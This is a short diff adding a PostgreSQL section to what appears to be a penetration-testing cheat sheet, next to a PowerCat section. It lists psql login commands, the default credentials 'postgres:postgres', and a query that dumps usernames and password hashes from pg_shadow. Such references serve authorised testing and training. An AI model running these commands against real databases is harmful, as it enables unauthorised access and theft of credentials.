@@ -3142,6 +3142,21 @@ QUIT
 
 
 
+## POSTGRESQL
+```sql
+# log in
+psql -h IP_here -U user_here
+psql -h IP_here -U user_here -p port_here
+
+# default creds
+postgres:postgres
+
+# dump usernames + password hashes
+SELECT usename, passwd from pg_shadow;
+```
+
+
+
 ## POWERCAT
 ```powershell
 # download powercat
